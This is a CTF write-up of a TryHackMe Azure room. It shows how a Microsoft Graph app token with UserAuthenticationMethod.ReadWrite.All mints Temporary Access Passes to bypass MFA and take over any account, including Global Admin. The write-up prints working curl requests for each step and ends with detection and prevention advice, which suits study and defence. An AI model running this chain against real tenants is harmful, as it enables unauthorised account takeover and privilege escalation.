---
title: 'Azure: Tapper, one permission to own the tenant'
date: 2026-06-03
summary: How an app-only Microsoft Graph token with a single narrow-looking permission (UserAuthenticationMethod.ReadWrite.All) becomes tenant-wide account takeover via a Temporary Access Pass.
series: 'Azure: Tapper'
part: 2
room: 'Azure: Tapper'
platform: TryHackMe
difficulty: Hard
tags: ['azure', 'entra-id', 'microsoft-graph', 'tap', 'mfa-bypass', 'privesc']
draft: false
---

[Part 1](/writeups/tapper-1-foothold) ended in the Azure resource plane, running
commands across VMs through an over-scoped managed identity. The real prize was in
the identity plane: an application token for Microsoft Graph. This part is about
how one permission on that token owns the whole tenant.

> Tenant IDs, app IDs and usernames are redacted/genericised. Endpoints and request
> shapes are public Microsoft Graph and shown for teaching, not as an answer key.

## TL;DR

The Tapper service principal's token carries exactly one Graph app role:
`UserAuthenticationMethod.ReadWrite.All`. It can't list users or read directory
roles, so it looks tightly scoped. But it can mint a Temporary Access Pass for any
user, which bypasses MFA and lets you sign in as them. The permission is narrow and
the blast radius is the whole tenant.

## A token that works, but for what?

With an app-only Graph token, the service principal reads back its own object
cleanly:

```bash
curl -s https://graph.microsoft.com/v1.0/servicePrincipals/<sp-id> \
  -H "Authorization: Bearer $TOKEN" | jq '{displayName, appId}'
# → { "displayName": "Tapper", "appId": "<redacted>" }
```

The token is valid and accepted by Graph. The next question is what it's allowed
to do. The way to answer that is to read the token itself rather than
guess. Decode the JWT payload and look at the `roles` claim:

```bash
echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq .roles
# → [ "UserAuthenticationMethod.ReadWrite.All" ]
```

One role. That's the entire blast radius, so the job is to understand what it does.

## Scoping the blast radius

It's tempting to spray broad reconnaissance, but this token is deliberately narrow.
The obvious recon endpoints fail:

```bash
curl -s https://graph.microsoft.com/v1.0/users          # Authorization_RequestDenied
curl -s https://graph.microsoft.com/v1.0/directoryRoles  # Insufficient privileges
```

So this is not a `Directory.Read.All` / `User.Read.All` token. No tenant-wide
user listing, no directory-role enumeration. A first read says "almost useless,"
and that read is wrong.

## The escalation: Temporary Access Pass

`UserAuthenticationMethod.ReadWrite.All` lets an app create and manage
authentication methods for any user, and a Temporary Access Pass (TAP) is just
another authentication method object. A TAP is a time-limited passcode Microsoft
designed to let someone bootstrap MFA. Handed to an attacker, it's an MFA bypass:

```bash
curl -s -X POST \
  "https://graph.microsoft.com/v1.0/users/<target-upn>/authentication/temporaryAccessPassMethods" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{ "lifetimeInMinutes": 60, "isUsableOnce": true }' | jq
# → { "temporaryAccessPass": "XXXXX-XXXXX", "lifetimeInMinutes": 60, ... }
```

Take that passcode to `login.microsoftonline.com`, sign in as the target, and you
can register your own authenticator, converting a 60-minute pass into durable
access. Point it at a privileged account and the single "narrow" permission becomes
Global Admin.

## The full chain

```
VM foothold  →  over-scoped managed identity  →  app-only Graph token
   →  role: UserAuthenticationMethod.ReadWrite.All
   →  mint Temporary Access Pass for a target user
   →  sign in (MFA bypassed)  →  register new auth method  →  account takeover
```

## Detect and prevent

- **Treat `UserAuthenticationMethod.ReadWrite.All` as tier-0.** It is an
  account-takeover primitive that looks like a benign "user" scope. Audit every app and
  service principal that holds it; almost none legitimately need it.
- **Lock down Temporary Access Pass.** Scope the TAP authentication-method policy to
  a small group, keep lifetimes short and single-use, and alert on TAP creation
  (`Authentication Methods` activity in the Entra audit log). Watch especially for
  the case where the creator is an application rather than an admin.
- **Watch app credential changes.** The real-world version of this chain starts with
  someone adding a client secret to an app they own. Alert on
  `Add service principal credentials` and review app-ownership sprawl.
- **Conditional Access on the sign-in.** Even with a valid TAP, device-compliance or
  trusted-location policies can blunt the final login step.

## Takeaway

Permission names lie about blast radius. "Read/write a user's authentication
methods" sounds like self-service MFA enrolment, but in practice it lets you become
any user. When you audit Graph application permissions, rank them by what they let an
attacker do rather than by how modest they sound.
